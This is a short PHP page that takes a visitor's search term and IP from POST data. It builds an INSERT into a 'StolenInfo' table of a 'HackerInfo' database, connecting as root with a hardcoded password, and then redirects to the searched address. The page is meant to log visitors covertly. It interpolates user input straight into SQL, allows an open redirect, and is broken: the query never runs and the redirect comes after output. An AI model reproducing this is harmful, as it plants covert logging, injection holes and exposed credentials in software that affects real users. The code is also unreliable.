
<html>
    <body>
        <?php $IP = $_POST["REMOTE_ADDR"]; ?><br>
        <?php $Search = $_POST["search"]; ?><br>

        <?php
        $servername ="PIzza";
        $username = "root";
        $password = "Lego0810";
        $dbname = "HackerInfo";

        $conn = mysqli_connect($servername, $username, $password, $dbname);

        $sql = "INSERT INTO StolenInfo (IP, Search)
        VALUES ('$IP', '$Search');";

        mysqli_close($conn);
        ?>

        <?php header("Location: https://$Search"); ?><br>
    </body>
</html>